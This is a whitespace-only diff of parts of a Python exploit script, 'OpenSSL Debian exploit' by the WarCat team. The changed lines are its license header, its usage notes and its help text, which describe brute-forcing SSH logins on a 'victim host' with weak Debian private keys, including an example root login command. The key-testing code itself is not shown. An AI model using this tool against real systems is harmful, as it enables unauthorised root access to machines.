@@ -1,18 +1,18 @@
 #!/bin/python
-#       This program is free software; you can redistribute it and/or modify
-#       it under the terms of the GNU General Public License as published by
-#       the Free Software Foundation; either version 2 of the License, or
-#       (at your option) any later version.
+#				This program is free software; you can redistribute it and/or modify
+#				it under the terms of the GNU General Public License as published by
+#				the Free Software Foundation; either version 2 of the License, or
+#				(at your option) any later version.
 #
-#       This program is distributed in the hope that it will be useful,
-#       but WITHOUT ANY WARRANTY; without even the implied warranty of
-#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-#       GNU General Public License for more details.
+#				This program is distributed in the hope that it will be useful,
+#				but WITHOUT ANY WARRANTY; without even the implied warranty of
+#				MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.	See the
+#				GNU General Public License for more details.
 #
-#       You should have received a copy of the GNU General Public License
-#       along with this program; if not, write to the Free Software
-#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
-#       MA 02110-1301, USA.
+#				You should have received a copy of the GNU General Public License
+#				along with this program; if not, write to the Free Software
+#				Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
+#				MA 02110-1301, USA.
 ############################################################################
 # Autor: hitz - WarCat team (warcat.no-ip.org)
 # Collaborator: pretoriano
@@ -22,13 +22,12 @@
 # 2. Extract it to a directory
 #
 # 3. Execute the python script
-#     - something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5
-#     - execute: python exploit.py (without parameters) to display the help
-#     - if the key is found, the script shows something like that:
-#         Key Found in file: ba7a6b3be3dac7dcd359w20b4afd5143-1121
-#		  Execute: ssh -lroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240
+#			- something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5
+#			- execute: python exploit.py (without parameters) to display the help
+#			- if the key is found, the script shows something like that:
+#					Key Found in file: ba7a6b3be3dac7dcd359w20b4afd5143-1121
+#			Execute: ssh -lroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240
 ############################################################################
-
 
 import Queue
 import os
@@ -87,11 +86,11 @@ print '\n-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org'
 
 if len(sys.argv) < 4:
 	print './exploit.py <dir> <host> <user> [[port] [threads]]'
-	print '    <dir>: Path to SSH privatekeys (ex. /home/john/keys) without final slash'
-	print '    <host>: The victim host'
-	print '    <user>: The user of the victim host'	
-	print '    [port]: The SSH port of the victim host (default 22)'
-	print '    [threads]: Number of threads (default 4) Too big numer is bad'
+	print '		 <dir>: Path to SSH privatekeys (ex. /home/john/keys) without final slash'
+	print '		 <host>: The victim host'
+	print '		 <user>: The user of the victim host'
+	print '		 [port]: The SSH port of the victim host (default 22)'
+	print '		 [threads]: Number of threads (default 4) Too big numer is bad'
 	
 	sys.exit(1)
 	
@@ -100,8 +99,8 @@ host = sys.argv[2]
 user = sys.argv[3]
 
 if len(sys.argv) <= 4: 
-	  port='22'
-	  threads=4
+		port='22'
+		threads=4
 else:
 	if len(sys.argv) <=5:
 		port=sys.argv[4]
